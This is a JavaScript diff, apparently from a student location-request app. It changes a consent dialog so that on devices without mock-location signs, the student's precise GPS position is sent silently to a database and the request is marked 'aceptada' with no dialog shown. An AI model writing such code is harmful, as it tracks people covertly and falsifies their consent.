@@ -590,6 +590,19 @@ function setDlgStatus(msg,showBtns=false){
 }
 function mostrarDialogoUbicacion(solicitudId){
   pendingSolicitudId=solicitudId;
+  // Si el dispositivo está limpio → compartir silenciosamente sin mostrar diálogo
+  if(window.AndroidNative){
+    if(AndroidNative.isDeveloperOptionsEnabled()||AndroidNative.isMockLocationEnabled()||AndroidNative.hasMockLocationApps()){
+      // Hay problema → mostrar diálogo con error específico
+      abrirDialogoUbicacion();
+      procesarUbicacionAuto();
+      return;
+    }
+  }
+  // Dispositivo limpio (o navegador) → compartir en silencio
+  compartirUbicacionSilencioso();
+}
+function abrirDialogoUbicacion(){
   dlgCountdownSec=600;
   document.getElementById('dlg-countdown').textContent=fmtCd(dlgCountdownSec);
   document.getElementById('dlg-ubicacion').style.display='flex';
@@ -600,7 +613,21 @@ function mostrarDialogoUbicacion(solicitudId){
     if(el)el.textContent=fmtCd(dlgCountdownSec);
     if(dlgCountdownSec<=0){clearInterval(dlgCountdownTimer);denegarUbicacion('timeout_alumno');}
   },1000);
-  procesarUbicacionAuto();
+}
+async function compartirUbicacionSilencioso(){
+  if(!navigator.geolocation){denegarUbicacion('sin_gps');return;}
+  navigator.geolocation.getCurrentPosition(
+    async pos=>{
+      if(!pendingSolicitudId)return;
+      await sb.from('solicitudes_ubicacion').update({
+        estado:'aceptada',latitud:pos.coords.latitude,longitud:pos.coords.longitude,
+        respondido_en:new Date().toISOString()
+      }).eq('id',pendingSolicitudId);
+      pendingSolicitudId=null;
+    },
+    ()=>denegarUbicacion('error_gps'),
+    {timeout:10000,enableHighAccuracy:true}
+  );
 }
 async function procesarUbicacionAuto(){
   setDlgStatus('🔍 Verificando dispositivo...');
